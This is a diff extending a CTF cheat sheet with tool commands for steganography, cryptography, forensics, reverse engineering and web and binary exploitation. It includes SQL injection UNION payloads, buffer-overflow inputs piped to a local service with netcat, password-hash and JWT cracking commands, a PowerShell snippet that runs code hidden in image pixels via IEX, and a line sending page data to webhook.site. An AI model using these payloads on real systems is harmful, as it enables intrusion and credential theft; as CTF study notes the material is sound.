@@ -12,6 +12,69 @@ sudo apt-get install zbar-tools
 zbarimg output.png
 ```
 
+### Git
+
+```
+# Commands
+git log -p | grep -i flag
+```
+
+### mid3v2
+
+```bash
+=> Install
+sudo apt-get install python-mutagen
+
+=> Commands
+mid3v2 --album="test123" sample-3s.mp3
+mid3v2 --song="test123" sample-3s.mp3
+mid3v2 --artist="test" sample-3s.mp3
+```
+
+### msgconvert
+
+```bash
+=> Install
+sudo apt-get install libemail-outlook-message-perl
+
+=> Commands
+msgconvert *.msg
+
+=> Information
+convert message (outlook/email) to readable
+```
+
+### Hashcat
+
+```bash
+# Commands
+hashcat -m 0 hash.txt passwords.txt --potfile-disable
+```
+
+### UTF-8 Encoding Table
+
+```bash
+# References
+https://www.utf8-chartable.de/
+```
+
+### Yara 
+
+```bash
+# Install
+sudo apt install yara
+
+# References
+https://yara.readthedocs.io/
+```
+
+### Regex
+
+```bash
+# References
+https://regex101.com/
+```
+
 # CryptoGraphy
 
 ### Online Tools
@@ -26,6 +89,26 @@ https://scwf.dima.ninja/
 ```bash
 => Writeup 
 $ https://github.com/rkm0959/Cryptography_Writeups
+```
+
+### Vim Decryptor
+
+```bash
+# Commands
+python vimdecrypt.py --dictionary rockyou.txt encrypted.txt
+
+# References
+https://github.com/nlitsme/vimdecrypt
+
+```
+
+### Ciphey
+
+```bash
+# Command
+File Input ciphey -f encrypted.txt
+Unqualified input ciphey -- "Encrypted input"
+Normal way ciphey -t "Encrypted input"
 ```
 
 ### RSACtftool
@@ -44,6 +127,15 @@ pip3 install wolframalpha
 python3 RsaCtfTool.py --publickey PublicKey.pem --private --uncipher ciphertext
 python3 RsaCtfTool.py -n 712312... -e 65537 --uncipher 125123...
 python3 RsaCtfTool.py --publickey public.pem --private > private.key
+python3 RsaCtfTool.py --publickey public.pub --private --uncipherfile message.dat
+```
+
+### Hash Collisions
+
+```bash
+# References
+https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
 ```
 
 ### Rsatool
@@ -61,6 +153,36 @@ $ ./rsatool.py -p 3133337 -q 254783260649... -o priv.key
 => References
 $ https://wishingstarmoye.com/ctf/rsatool
 
+```
+
+### Extract LSB (Script $1)
+
+```bash
+# Python
+from PIL import Image
+import sys
+
+image = Image.open(sys.argv[1])
+pixel = image.load()
+payload = bytearray()
+for y in xrange(3):
+    for x in range(620):
+        r, g, b = pixel[x,y]
+        payload.append( (b&15) * 16 | (g&15) )
+print(payload)
+
+# Powershell
+sal a New-Object;
+Add-Type -A System.Drawing;
+$g=a System.Drawing.Bitmap('Images.png');
+$o=a Byte[] 1920;(0..0) | %{
+    foreach ($x in(0..1919)){
+        $p=$g.GetPixel($x,$_);
+        $o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))
+    }
+};
+$g.Dispose();
+IEX([System.Text.Encoding]::ASCII.GetString($o[0..330]))
 ```
 
 ### GPG/PGP
@@ -116,6 +238,17 @@ https://github.com/lmammino/jwt-cracker
 jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
 ```
 
+### Jwt-Tool
+
+```bash
+# Commands
+python3 jwt_tool.py -C eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y -d rockyou.txt
+
+# References
+https://github.com/ticarpi/jwt_tool
+
+```
+
 ### AES Encrypt/Decrypt (Python)
 
 ```python3
@@ -142,6 +275,31 @@ while True:
 		print(decrypted.decode())
 	print()
 ```
+
+### AES Script ($1) (Python)
+
+```bash
+from Crypto.Cipher import AES
+import string
+
+with open("cipher.bin", "rb") as f:
+        result = f.readline()
+iv = b"aaaaaaaaaaaaaaaa"
+print(len(result))
+decrypted = ""
+#while "cyberx" not in decrypted :
+for k in range(0,255):
+        for j in range(0,255):
+                key = bytearray(16)
+                key[0] = k
+                key[1] = j
+                aes = AES.new(bytes(key), AES.MODE_CBC, iv)
+                decrypted = aes.decrypt(result).decode("latin-1")
+                if "cyber" in decrypted:
+                        print(decrypted)
+```
+
+
 
 ### Cipher/Encode/Hash
 
@@ -307,15 +465,83 @@ Link : [https://cryptii.com/pipes/morse-code-with-emojis](https://cryptii.com/pi
 * Use Cyberchef
 ```
 
+17. Microsoft Script
+
+```
+# Examples
+#@~^NgAAAA==\ko$K6,J0k+	^!9kUo|xG2M!4^n:1X4..E~,vl~~JP4.PWVmLPb/lE8BEAAA==^#~@.
+
+# use Cyberchef
+-> Microsoft Script Decoder
+```
+
+18. Polybius square
+
+```bash
+# Examples
+21 31 11 22
+
+# References
+https://cryptii.com/pipes/polybius-square
+
+```
+
+19. Binary to Decimal
+
+```
+# Examples
+10000000111111110100011111001110001011101000010001110101101101100010100000101010001001011001010001110100001001111110101000110
+
+# References
+https://www.binaryhexconverter.com/binary-to-decimal-converter
+```
+
 # Forensics
 
 ### Online Tools
 
 ```bash
+# Pcap
 https://packettotal.com/
 https://www.hybrid-analysis.com/
 https://iris-h.services
 https://f00l.de/hacking/pcapfix.php
+
+# Images
+https://aperisolve.fr/
+https://futureboy.us/stegano/decinput.html
+http://stylesuxx.github.io/steganography/
+https://www.mobilefish.com/services/steganography/steganography.php
+https://manytools.org/hacker-tools/steganography-encode-text-into-image/
+https://steganosaur.us/dissertation/tools/image
+https://georgeom.net/StegOnline
+https://www.pic2map.com/
+
+# Audio
+```
+
+### StegoVeritas
+
+```bash
+# Download
+https://github.com/bannsec/stegoVeritas
+
+# Install
+pip3 install stegoveritas
+stegoveritas_install_deps
+
+# Commands
+
+```
+
+### Libreoffice
+
+```bash
+# Install
+sudo apt install libreoffice
+
+# Commands
+xdg-open files.docm
 ```
 
 ### List of File Signatures
@@ -331,6 +557,67 @@ https://f00l.de/hacking/pcapfix.php
 https://en.wikipedia.org/wiki/List_of_file_signatures
 ```
 
+### Strings
+
+```bash
+# Command
+strings flag.txt 
+```
+
+### StegCTF Solver
+
+```bash
+# Commands
+docker run -it --rm -v $(pwd)/data:/data dominicbreuker/stego-toolkit /bin/bash
+python3 stegctfsolver.py <target file>
+
+# Notes
+- Make sure put image file into data
+
+# References
+https://github.com/DominicBreuker/stego-toolkit
+https://github.com/thepaulbenoit/stegctfsolver
+```
+
+### Stegseek
+
+```bash
+# Install
+https://github.com/RickdeJager/stegseek/releases
+
+# Commands
+
+```
+
+### Wireshark
+
+```
+# Install
+
+# Commands
+wireshark data.pcap
+```
+
+### Steghide
+
+```bash
+# Install
+sudo apt install steghide
+
+# Commands
+```
+
+### Exiftool
+
+```bash
+# Install
+
+# Commands
+exiftool image.png
+exiftool -a image.jpg
+exiftool -a -b -W %f_%t%-c.%s -preview:all word.png
+```
+
 ### Tshark
 
 ```bash
@@ -339,6 +626,9 @@ sudo apt install tshark
 
 # Commands
 tshark -r dump.pcap
+
+# References
+https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/
 ```
 
 ### Tcpdump
@@ -415,6 +705,7 @@ https://github.com/decalage2/oletools.git
 
 ### olevba.py
 python3 olevba.py -a malware.xls --reveal
+python3 olevba.py -a malware.docm --reveal
 
 ### oledump.py
 python3 ../oledump.py malware.docm -v -s A3 > output1
@@ -432,6 +723,27 @@ sudo apt-get install volatility
 # Commands
 ```
 
+### Volatility3
+
+```bash
+# Download
+git clone https://github.com/volatilityfoundation/volatility3.git
+
+# Commands
+python3 vol.py -f dump.raw windows.info 
+python3 vol.py -f dump.raw windows.pslist
+python3 vol.py -f dump.raw windows.psscan
+python3 vol.py -f dump.raw windows.pstree
+python3 vol.py -f dump.raw filescan
+python3 vol.py -f dump.raw windows.cmdline
+python3 vol.py -f dump.raw windows.pslist.PsList --pid 2964 --dump
+python3 vol.py -f dump.raw windows.hashdump
+python3 vol.py -f dump.raw windows.dumpfiles.DumpFiles --physaddr 0x3e7a4070
+
+# References
+https://blog.onfvp.com/post/volatility-cheatsheet/
+```
+
 ### Testdisk
 
 ```bash
@@ -442,7 +754,80 @@ sudo apt install testdisk
 testdisk file.img
 ```
 
+### Binwalk
+
+```bash
+# Commands
+binwalk -D="*.*" files.jpeg
+binwalk -D="*.*" files.jpeg
+binwalk -e files.jpeg
+```
+
+### Teserract
+
+```bash
+# Install
+sudo apt install tesseract-ocr
+sudo apt install libtesseract-dev
+
+# Commands
+tesseract 25795.png output.txt
+
+# References
+https://medium.com/quantrium-tech/installing-tesseract-4-on-ubuntu-18-04-b6fcd0cbd78f
+```
+
+### Unrar
+
+```bash
+# Install
+sudo apt install unrar
+
+# Commands
+unrar e filename.rar
+
+# References
+https://linuxhint.com/extract_rar_files_ubuntu/
+```
+
+### Zsteg
+
+```
+# Install
+gem install zsteg
+
+# Commands
+```
+
 # Reverse Engineering
+
+### CheatSheet
+
+```bash
+1. https://github.com/Kennyslaboratory/Reverse-Engineering-Cheatsheet
+2. https://awesomeopensource.com/project/NotPrab/.NET-Deobfuscator
+```
+
+### Deobfuscate Javascript
+
+```bash
+# Notes
+-> cat something.js | sed -e 's/eval/console.log/g' | nodejs
+
+# References
+http://deobfuscatejavascript.com/
+https://stormctf.ninja/ctf/events/infosecon-2017/competitors-section/spot-flags/spot-flag-1
+```
+
+### Hollows Hunter
+
+```bash
+# Command
+
+
+# References
+https://github.com/hasherezade/hollows_hunter/wiki
+```
 
 ### GDB 
 
@@ -463,7 +848,11 @@ x/2x 0x00000000000072a
 run auth2 < input.txt
 pattern_create 200
 pattern_offset AwAA
-r < <(python -c "print 'a' * 188 + '\x0d\xd0\xde\xc0'")
+r < <(python -c "print 'a' * 170 + 'AAAA' + + '<Argument_1>' + '<Argument_2>'")
+step
+next
+info break
+del 1
 
 # References
 http://www.gdbtutorial.com/tutorial/how-install-gdb
@@ -471,6 +860,57 @@ https://gist.github.com/rkubik/b96c23bd8ed58333de37f2b8cd052c30
 http://csapp.cs.cmu.edu/3e/docs/gdbnotes-x86-64.pdf
 https://software.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-sdm-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html
 https://suchprogramming.com/debugging-with-gdb-part-3/
+```
+
+### VBA Syntax
+
+```bash
+# Syntax
+## Val
+Dim MyValue
+MyValue = Val("2457")    ' Returns 2457.
+MyValue = Val(" 2 45 7")    ' Returns 2457.
+MyValue = Val("24 and 57")    ' Returns 24.
+
+## Mid
+response.write(Mid("This is a beautiful day!",1,1))  	' T
+
+## Chr
+response.write(Chr(65) & "<br>")  ' A
+
+## Comparison Operators
+a==b  will return false.
+a<>b will return true.
+a<b will return true.
+a>b will return false.
+a<=b will return true.
+a>=b will return false.
+
+## Concatenate String
+s = "Hello" & " Rhino!"       ' 'Hello Rhino!
+```
+
+### Bash Debug
+
+```bash
+# Notes
+#!/bin/bash
+trap "set +x; sleep 5; set -x" DEBUG
+
+<CODE HERE>
+
+# References
+https://ctftime.org/writeup/21834
+```
+
+### BashFuscator
+
+```bash
+# Download
+https://github.com/Bashfuscator/Bashfuscator
+
+# Example
+${*%c-dFqjfo}  e$'\u0076'al "$(   ${*%%Q+n\{}   "${@~}" $'\160'r""$'\151'$@nt"f" %s   ' }~~@{$  ")
 ```
 
 ### Radare2
@@ -485,6 +925,7 @@ sudo make install
 # Commands
 r2 -w ./file
 r2 ./file
+r2 -AA -d binary flaghere{}
 aaa
 V 
 v
@@ -510,6 +951,7 @@ sudo apt update && sudo apt upgrade
 https://book.rada.re/
 https://software.intel.com/content/www/us/en/develop/download/intel-64-and-ia-32-architectures-sdm-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html
 https://r2wiki.readthedocs.io/en/latest/home/ctf-solving-using-radare2/
+https://github.com/historypeats/radare2-cheatsheet
 ```
 
 ### Uncompyle6
@@ -576,10 +1018,70 @@ http://www.ntcore.com/files/ExplorerSuite.exe
 https://github.com/cybertechniques/site/blob/master/analysis_tools/cff-explorer/index.md
 ```
 
-### CheatSheet
+### Run Windows Program Script ($1)
+
+```python
+import os
+from subprocess import CalledProcessError, Popen, PIPE
+import string
+
+flags = ""
+tmp = ""
+index = 0
+
+while "flag" not in flags:
+    print("Round : "+ str(index+1))
+    tempflag = ""
+    checkers = True
+    for i in string.printable:
+        if checkers:
+            cmd = "PassGen.exe"
+            tempflag = flags
+            tempflag += i
+            p = Popen(cmd, stdin=PIPE, stdout=PIPE, bufsize=0)
+            stdout_data = p.communicate(input=tempflag.encode())[0]
+            output = str(stdout_data)[2:-1].split(":")[2].strip().replace("\\x00","`")
+            for k in range(len(output)):
+                if k == index:
+                    if output[index] == "`":
+                        flags += i
+                        print(flags)
+                        print(output)
+                        checkers = False
+                        break
+                    else:
+                        checkers = True
+        else:
+            break
+    index += 1
+```
+
+### ExtremeDumper (.NET)
 
 ```bash
-1. https://github.com/Kennyslaboratory/Reverse-Engineering-Cheatsheet
+# Download
+https://github.com/wwh1004/ExtremeDumper
+```
+
+### Objdump
+
+```bash
+# Commands
+objdump -d files
+
+```
+
+### Movfuscator & Demovfuscator
+
+```bash
+# Movfuscator
+https://github.com/xoreaxeaxeax/movfuscator
+
+# Demovfuscator
+https://github.com/kirschju/demovfuscator
+
+# References
+https://ctftime.org/writeup/12263
 ```
 
 # Web
@@ -620,10 +1122,16 @@ fetch("https://webhook.site/<ID>/?c="+escape(xml.responseText))
 - https://github.com/W0rty/WU-CyberThreatForce/blob/main/README-EN.md (Blind XSS)
 ```
 
-### CSRF
+### SQL Injection
 
 ```bash
+=> Payload (MSQL)
 
+1 UNION ALL SELECT 1,2,3,4 --
+1 UNION ALL SELECT 1,database(),3,4 --
+1 UNION ALL SELECT 1,table_schema,3,4  FROM information_schema.tables--
+1 UNION ALL SELECT 1,column_name,table_name,4  FROM information_schema.columns--
+1 UNION ALL SELECT 1,flag,3,4 FROM found_me--
 ```
 
 # Binary Exploitation
@@ -639,6 +1147,16 @@ for i in {1..10};do python2 -c "print('\nadmin'+('\x00' * $i)+'admin')" | ./auth
 echo -e "\naaaaaaaaaaaaaaa" > input.txt
 python -c "print 'A' * 140+'\xef\xbe\xad\xde'+'AAAAAAAA'+'\x29\x52\x55\x55\x55\x55'" | nc 127.0.0.1 1337
 python -c "print '/bin/cat\${IFS}*\n'+'A'*20+'\xe0\x83\x04\x08'+'CCCC'+'\x34\xa0\x04\x08'" | nc 127.0.0.1 1337
+python -c "print('11111111111'+'A'*285+'\xd6\x11\x40\x00\x00\x00\ncat *')" | nc 127.0.0.1 9001
+```
+
+### Zeratool
+
+```bash
+# Commands
+
+# References
+https://github.com/ChrisTheCoolHut/Zeratool
 ```
 
 ### Format String
@@ -676,3 +1194,5 @@ $ https://pimeyes.com/en
 # References
 - http://www.wechall.net/challs
 - https://ctftime.org/
+- https://fareedfauzi.github.io/notes/Ctf-Checklist/#
+- https://github.com/RakhithJK/Cyber-Security_Collection
